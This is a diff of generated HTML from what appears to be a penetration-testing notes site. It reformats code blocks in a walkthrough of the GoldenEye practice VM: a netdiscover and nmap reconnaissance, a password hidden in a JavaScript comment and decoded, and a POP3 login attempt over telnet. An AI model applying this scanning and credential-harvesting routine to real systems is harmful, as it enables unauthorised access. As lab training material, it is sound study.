@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17450,74 +17473,127 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h3 id="reconnaissance">Reconnaissance</h3>
 <h4 id="first-we-need-to-identify-our-ip-and-afterwards-our-ips-victim-address"><strong>First</strong>, we need to identify our IP, and afterwards our IP's victim address.</h4>
 <p>For that we'll be using <a href="../netdiscover/">netdiscover</a>.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>ip<span class="w"> </span>a
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>ip<span class="w"> </span>a
+</span></code></pre></div></td></tr></table></div>
 <p>eth1 interface of the attacker machine will be: 192.168.56.105.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo<span class="w"> </span>netdiscover<span class="w"> </span>-i<span class="w"> </span>eth1<span class="w"> </span>-r<span class="w"> </span><span class="m">192</span>.168.56.105/24
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>sudo<span class="w"> </span>netdiscover<span class="w"> </span>-i<span class="w"> </span>eth1<span class="w"> </span>-r<span class="w"> </span><span class="m">192</span>.168.56.105/24
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                   
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a> _____________________________________________________________________________
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a> -----------------------------------------------------------------------------
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a> 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor                                                  
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a> 192.168.56.100  08:00:27:66:9a:ab      1      60  PCS Systemtechnik GmbH                                          
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a> 192.168.56.101  08:00:27:dd:34:ac      1      60  PCS Systemtechnik GmbH
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a> ```
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a> So, the victim&#39;s IP address is: 192.168.56.101.
-</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>
-</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>
-</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>#### **Secondly**, let&#39;s run a port scan to see services:
-</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>
-</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>```bash
-</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>nmap -p- -A 192.168.56.101
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span>
+<span class="normal"><a href="#__codelineno-2-11">11</a></span>
+<span class="normal"><a href="#__codelineno-2-12">12</a></span>
+<span class="normal"><a href="#__codelineno-2-13">13</a></span>
+<span class="normal"><a href="#__codelineno-2-14">14</a></span>
+<span class="normal"><a href="#__codelineno-2-15">15</a></span>
+<span class="normal"><a href="#__codelineno-2-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                   
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a> _____________________________________________________________________________
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a> -----------------------------------------------------------------------------
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a> 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor                                                  
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a> 192.168.56.100  08:00:27:66:9a:ab      1      60  PCS Systemtechnik GmbH                                          
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a> 192.168.56.101  08:00:27:dd:34:ac      1      60  PCS Systemtechnik GmbH
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a> ```
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10"></a> So, the victim&#39;s IP address is: 192.168.56.101.
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11"></a>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12"></a>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13"></a>#### **Secondly**, let&#39;s run a port scan to see services:
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14"></a>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15"></a>```bash
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16"></a>nmap -p- -A 192.168.56.101
+</span></code></pre></div></td></tr></table></div>
 <p>And results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-17 13:31 EST
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Nmap scan report for 192.168.56.101
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Host is up (0.00013s latency).
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Not shown: 65531 closed tcp ports (conn-refused)
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>PORT      STATE SERVICE  VERSION
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>25/tcp    open  smtp     Postfix smtpd
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>| ssl-cert: Subject: commonName=ubuntu
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>| Not valid before: 2018-04-24T03:22:34
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>|_Not valid after:  2028-04-21T03:22:34
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>|_ssl-date: TLS randomness does not represent time
-</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
-</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>|_http-title: GoldenEye Primary Admin Server
-</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>|_http-server-header: Apache/2.4.7 (Ubuntu)
-</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>55006/tcp open  ssl/pop3 Dovecot pop3d
-</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>|_pop3-capabilities: SASL(PLAIN) RESP-CODES TOP USER UIDL PIPELINING AUTH-RESP-CODE CAPA
-</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>|_ssl-date: TLS randomness does not represent time
-</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
-</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>| Not valid before: 2018-04-24T03:23:52
-</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>|_Not valid after:  2028-04-23T03:23:52
-</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>55007/tcp open  pop3     Dovecot pop3d
-</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE STLS SASL(PLAIN) USER CAPA PIPELINING TOP UIDL
-</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>|_ssl-date: TLS randomness does not represent time
-</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
-</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>| Not valid before: 2018-04-24T03:23:52
-</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>|_Not valid after:  2028-04-23T03:23:52
-</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>
-</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>Nmap done: 1 IP address (1 host up) scanned in 40.89 seconds
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-3-10">10</a></span>
+<span class="normal"><a href="#__codelineno-3-11">11</a></span>
+<span class="normal"><a href="#__codelineno-3-12">12</a></span>
+<span class="normal"><a href="#__codelineno-3-13">13</a></span>
+<span class="normal"><a href="#__codelineno-3-14">14</a></span>
+<span class="normal"><a href="#__codelineno-3-15">15</a></span>
+<span class="normal"><a href="#__codelineno-3-16">16</a></span>
+<span class="normal"><a href="#__codelineno-3-17">17</a></span>
+<span class="normal"><a href="#__codelineno-3-18">18</a></span>
+<span class="normal"><a href="#__codelineno-3-19">19</a></span>
+<span class="normal"><a href="#__codelineno-3-20">20</a></span>
+<span class="normal"><a href="#__codelineno-3-21">21</a></span>
+<span class="normal"><a href="#__codelineno-3-22">22</a></span>
+<span class="normal"><a href="#__codelineno-3-23">23</a></span>
+<span class="normal"><a href="#__codelineno-3-24">24</a></span>
+<span class="normal"><a href="#__codelineno-3-25">25</a></span>
+<span class="normal"><a href="#__codelineno-3-26">26</a></span>
+<span class="normal"><a href="#__codelineno-3-27">27</a></span>
+<span class="normal"><a href="#__codelineno-3-28">28</a></span>
+<span class="normal"><a href="#__codelineno-3-29">29</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-17 13:31 EST
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>Nmap scan report for 192.168.56.101
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>Host is up (0.00013s latency).
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>Not shown: 65531 closed tcp ports (conn-refused)
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a>PORT      STATE SERVICE  VERSION
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a>25/tcp    open  smtp     Postfix smtpd
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7"></a>|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8"></a>| ssl-cert: Subject: commonName=ubuntu
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9"></a>| Not valid before: 2018-04-24T03:22:34
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10"></a>|_Not valid after:  2028-04-21T03:22:34
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11"></a>|_ssl-date: TLS randomness does not represent time
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12"></a>80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13"></a>|_http-title: GoldenEye Primary Admin Server
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14"></a>|_http-server-header: Apache/2.4.7 (Ubuntu)
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15"></a>55006/tcp open  ssl/pop3 Dovecot pop3d
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16"></a>|_pop3-capabilities: SASL(PLAIN) RESP-CODES TOP USER UIDL PIPELINING AUTH-RESP-CODE CAPA
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17"></a>|_ssl-date: TLS randomness does not represent time
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18"></a>| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19"></a>| Not valid before: 2018-04-24T03:23:52
+</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20"></a>|_Not valid after:  2028-04-23T03:23:52
+</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21"></a>55007/tcp open  pop3     Dovecot pop3d
+</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22"></a>|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE STLS SASL(PLAIN) USER CAPA PIPELINING TOP UIDL
+</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23"></a>|_ssl-date: TLS randomness does not represent time
+</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24"></a>| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25"></a>| Not valid before: 2018-04-24T03:23:52
+</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26"></a>|_Not valid after:  2028-04-23T03:23:52
+</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27"></a>
+</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28"></a>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29"></a>Nmap done: 1 IP address (1 host up) scanned in 40.89 seconds
+</span></code></pre></div></td></tr></table></div>
 <p>As there is an Apache server, let's see what is in there. We'll be opening http://192.168.56.101 in our browser. </p>
 <p>In the front page they will give you an url to login: /serv-home/, and looking at the source code, in the terminal.js file you can read a section commented out:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>//
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>//Boris, make sure you update your default password. 
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>//My sources say MI6 maybe planning to infiltrate. 
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>//Be on the lookout for any suspicious network traffic....
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>//
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>//I encoded you p@ssword below...
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>//
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>//
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>//BTW Natalya says she can break your codes
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>//
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-4-10">10</a></span>
+<span class="normal"><a href="#__codelineno-4-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>//
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>//Boris, make sure you update your default password. 
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>//My sources say MI6 maybe planning to infiltrate. 
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>//Be on the lookout for any suspicious network traffic....
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a>//
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>//I encoded you p@ssword below...
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a>//
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a>//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a>//
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a>//BTW Natalya says she can break your codes
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a>//
+</span></code></pre></div></td></tr></table></div>
 <p>Now, we have two usernames: boris and natalya, and we also have an aparently URL-encoded password. By using Burp Decode, we can extract the password: InvincibleHack3r</p>
 <h4 id="third-now-we-can-browse-to-http19216856101sev-home"><strong>Third</strong>, now we can browse to http://192.168.56.101/sev-home</h4>
 <p>A <a href="../webexploitation/http-authentication-schemes/">Basic-Authentification</a> pop-up layer will be displayed. To login into the system, enter:</p>
@@ -17528,58 +17604,89 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h4 id="fourth-in-the-landing-page-we-can-read-this-valuable-information"><strong>Fourth</strong>, in the landing page we can read this valuable information:</h4>
 <p>"Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port". </p>
 <p>Also by looking at the source code we can read this commented line:</p>
-<div class="language-html highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="cm">&lt;!-- Qualified GoldenEye Network Operator Supervisors: Natalya Boris --&gt;</span>
-</span></code></pre></div>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="cm">&lt;!-- Qualified GoldenEye Network Operator Supervisors: Natalya Boris --&gt;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>mmmm</p>
 <p>As we know there are some high ports (such as 55006 and 55007) open and running dovecot pop3 service, maybe we can try to access it with the telnet protocol in port 55007. Also, we could have used netcat.  </p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>telnet<span class="w"> </span><span class="m">192</span>.168.56.101<span class="w"> </span><span class="m">55007</span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>telnet<span class="w"> </span><span class="m">192</span>.168.56.101<span class="w"> </span><span class="m">55007</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Trying 192.168.56.101...
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>Connected to 192.168.56.101.
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>Escape character is &#39;^]&#39;.
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>+OK GoldenEye POP3 Electronic-Mail System
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>USER boris
-</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>+OK
-</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>PASSWORD InvincibleHack3r
-</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>-ERR Unknown command.
-</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>PASS InvincibleHack3r
-</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>-ERR [AUTH] Authentication failed.
-</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>USER natalya
-</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>+OK
-</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>PASS InvincibleHack3r
-</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>-ERR [AUTH] Authentication failed.
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-7-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-7-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-7-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-7-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-7-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-7-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-7-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-7-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-7-10">10</a></span>
+<span class="normal"><a href="#__codelineno-7-11">11</a></span>
+<span class="normal"><a href="#__codelineno-7-12">12</a></span>
+<span class="normal"><a href="#__codelineno-7-13">13</a></span>
+<span class="normal"><a href="#__codelineno-7-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>Trying 192.168.56.101...
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>Connected to 192.168.56.101.
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a>Escape character is &#39;^]&#39;.
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a>+OK GoldenEye POP3 Electronic-Mail System
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a>USER boris
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6"></a>+OK
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7"></a>PASSWORD InvincibleHack3r
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8"></a>-ERR Unknown command.
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9"></a>PASS InvincibleHack3r
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10"></a>-ERR [AUTH] Authentication failed.
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11"></a>USER natalya
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12"></a>+OK
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13"></a>PASS InvincibleHack3r
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14"></a>-ERR [AUTH] Authentication failed.
+</span></code></pre></div></td></tr></table></div>
